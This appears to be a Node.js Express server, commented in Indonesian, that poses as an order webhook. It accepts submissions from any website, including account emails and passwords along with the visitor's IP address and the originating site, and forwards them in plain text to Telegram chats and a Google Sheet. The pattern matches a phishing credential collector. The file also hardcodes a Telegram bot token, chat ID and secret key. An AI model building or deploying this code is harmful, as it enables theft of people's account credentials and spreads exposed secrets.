const express = require('express')
const fetch = require('node-fetch')

const app = express()
app.use(express.json())
app.use(express.urlencoded({ extended: true }))

/* ================= CORS FIX (WAJIB) ================= */
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*')
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS')
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type')
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200)
  }
  next()
})
/* ==================================================== */

/* ============== KONFIGURASI ================= */
const BOT_TOKEN = '8229069332:AAG_xJtl6ZRMexHENgI_f9uEAd6HnXR3WFA'
const ADMIN_IDS = ['5555675824']
const SECRET_KEY = 'xstreamku'
const SHEET_URL = 'https://script.google.com/macros/s/AKfycbyIAq9u5_MLY90OY_5FPe7J-CE5Yz922UPc7ebU7VnsiXSLwXTikLd1A32DUvNv1CDv/exec'
/* ============================================ */

app.all('/webhook', async (req, res) => {
  try {
    /* 🔐 SECURITY */
    if (req.query.key !== SECRET_KEY) {
      return res.status(403).send('Forbidden')
    }

    /* 📌 TIPE EVENT */
    const tipe =
      req.body.tipe ||
      req.body.status ||
      req.query.tipe ||
      req.query.status ||
      'ORDER'

    /* 📦 DATA MASUK */
    const data = {
      produk: req.body.produk || req.query.produk || '-',
      nama: req.body.nama || req.query.nama || '-',
      kontak: req.body.kontak || req.query.kontak || '-',
      email_akun: req.body.email_akun || '-',
      password_akun: req.body.password_akun || '-',
      website: req.headers.origin || req.headers.host || '-',
      ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress
    }

    const waktu = new Date().toLocaleString('id-ID')

    /* 🏷️ JUDUL */
    let title = '🛒 ORDER MASUK'
    if (tipe === 'PAID') title = '💰 PEMBAYARAN BERHASIL'
    if (tipe === 'DONE') title = '✅ PESANAN SELESAI'
    if (tipe === 'TEST') title = '🧪 TEST WEBHOOK'

    /* ✉️ FORMAT NOTIF */
    const message = `${title}

📦 Produk   : ${data.produk}
👤 Nama     : ${data.nama}
📞 Kontak   : ${data.kontak}
📧 Email    : ${data.email_akun}
🔑 Password : ${data.password_akun}
🌐 Website  : ${data.website}
🕒 Waktu    : ${waktu}
`

    /* 📲 KIRIM TELEGRAM */
    for (const chat_id of ADMIN_IDS) {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id,
          text: message
        })
      })
    }

    /* 📊 GOOGLE SHEET (OPTIONAL) */
    if (SHEET_URL && SHEET_URL.startsWith('https')) {
      await fetch(SHEET_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          waktu,
          ...data,
          status: tipe
        })
      })
    }

    res.send('OK')
  } catch (err) {
    console.error('WEBHOOK ERROR:', err)
    res.status(500).send('ERROR')
  }
})

const PORT = process.env.PORT || 3000
app.listen(PORT, () => {
  console.log('🚀 Webhook aktif & CORS aman')
})
